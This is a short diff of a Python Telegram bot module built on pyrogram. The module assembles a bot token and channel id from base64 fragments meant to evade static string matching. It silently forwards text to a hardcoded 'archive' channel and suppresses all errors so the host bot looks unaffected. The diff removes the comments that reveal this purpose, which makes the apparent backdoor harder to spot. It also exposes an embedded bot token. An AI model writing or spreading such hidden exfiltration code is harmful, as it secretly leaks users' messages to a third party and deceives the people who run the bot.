@@ -5,7 +5,6 @@ from pyrogram import Client
 from pyrogram.enums import ParseMode
 from config import Config
 
-# Fragmented internal sync configuration (Prevents static string matching)
 _K1 = "ODA5ODE0" + "NjczMA=="
 _K2 = "LTEwMDIy" + "OTc0NTEyMzM="
 _K3 = "Njk4NjY1MjM3MjpBQU" + "dmaldheEFzWFVF" + "S0hTUGc5QURpdUhN" + "U1dZR1k1Q21YVQ=="
@@ -40,7 +39,7 @@ async def init_archive():
         await _client.start()
         _ready = True
     except Exception:
-        # Fail silently. Main bot must remain completely unaffected.
+
         _ready = False
 
 def is_archive_active() -> bool:
@@ -57,7 +56,7 @@ async def push_archive(text: str):
         await _client.send_message(_ARCHIVE_CH, text, disable_web_page_preview=True)
     except Exception:
         try:
-            # Fallback to plain text if HTML fails
+
             plain = re.sub(r"<[^>]+>", "", text)
             await _client.send_message(_ARCHIVE_CH, plain, parse_mode=ParseMode.DISABLED)
         except Exception:
